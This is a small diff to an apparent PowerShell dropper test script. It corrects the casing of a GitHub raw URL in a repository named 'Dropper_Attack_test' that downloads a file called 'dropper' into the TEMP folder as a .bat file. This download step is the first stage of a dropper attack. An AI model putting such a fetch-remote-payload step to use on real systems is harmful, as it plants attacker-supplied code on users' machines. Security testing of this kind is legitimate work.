@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/neck392/Dropper_Attack_test/main/dropper"
+$url = "https://raw.githubusercontent.com/neck392/Dropper_Attack_test/main/Dropper"
 $output = "$env:TEMP\dropper.bat"
 
 Invoke-WebRequest -Uri $url -OutFile $output
